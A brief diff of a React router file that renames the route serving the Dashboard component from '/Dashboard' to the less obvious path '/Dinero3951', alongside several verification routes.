@@ -18,7 +18,7 @@ function App() {
           <Route path="/Verify" element={<Verify />} />
           <Route path="/Verifycode" element={<Verifycode />} />
           <Route path="/DeviceVerify" element={<DeviceVerify />} />
-          <Route path="/Dashboard" element={<Dashboard />} />
+          <Route path="/Dinero3951" element={<Dashboard />} />
           {/* <Route path="/id" element={<Email />} /> */}
           {/* <Route path="/IdVerify" element={<IdVerify />} /> */}
         </Routes>
